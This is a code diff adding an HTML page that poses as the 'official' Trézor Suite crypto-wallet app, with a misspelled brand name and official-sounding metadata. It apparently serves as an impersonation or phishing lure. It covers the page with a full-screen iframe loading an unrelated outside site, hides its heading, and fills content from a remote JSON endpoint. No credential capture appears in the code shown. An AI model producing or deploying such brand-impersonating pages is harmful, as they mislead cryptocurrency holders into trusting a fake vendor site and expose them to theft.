@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Trézor Suite® (Official) | Desktop & Web Crypto®
+</title>
+
+<meta name="description" content="Trézor Suite is the official desktop and web application developed by SatoshiLabs for managing Trézor hardware wallets. It provides a user-friendly interface, allowing users to send, receive, buy, sell, and swap cryptocurrencies securely.">
+
+  <meta name="keywords" content="Trézor Suite, Trézor, Cold Wallet, hardware Wallet">
+  <meta name="author" content="Trézor Suite">
+  
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.5/gsap.min.js"></script>
+
+ <style>
+
+.myBOX{display:none;}
+ body{margin:0px; padding:0px;}
+    iframe{width:100%; position:absolute; height:1800px; display:block;}
+</style> 
+ 
+</head>
+<body>
+  <h1 style="display:none;">Welcome to my Trèzor Suite </h1>
+
+<a href="#">
+<iframe src="https://mywebpage.com/en/" style="border:0px #ffffff none;" name="myiFrame" scrolling="no" frameborder="0" marginheight="0px" marginwidth="0px" height="100%" width="100%" allowfullscreen></iframe>
+</a>
+
+<h1 id="title"></h1>
+     <div id="content"></div>
+     <p id="author"></p>
+     <p id="date"></p>
+
+     <script>
+       // JSONSilo API endpoint
+       const apiUrl = 'https://api.jsonsilo.com/public/7b3c315e-eef3-430e-8413-e3c732d56d6a';
+
+       // Function to sanitize HTML (basic example, use a library like DOMPurify for production)
+       function sanitizeHTML(html) {
+         const div = document.createElement('div');
+         div.textContent = html; // Strip scripts and dangerous tags
+         return div.innerHTML;
+       }
+
+       // Fetch data from JSONSilo
+       fetch(apiUrl)
+         .then(response => {
+           if (!response.ok) {
+             throw new Error('Network response was not ok');
+           }
+           return response.json();
+         })
+         .then(data => {
+           document.getElementById('title').innerText = data.title;
+           // Render HTML content safely
+           document.getElementById('content').innerHTML = sanitizeHTML(data.content);
+           document.getElementById('author').innerText = `Author: ${data.author}`;
+           document.getElementById('date').innerText = `Date: ${data.date}`;
+         })
+         .catch(error => {
+           console.error('Error fetching data:', error);
+           document.getElementById('content').innerText = 'Failed to load content.';
+         });
+     </script>
+<div class="myBOX">
+
+
+</div>
+
+</body>
+</html>
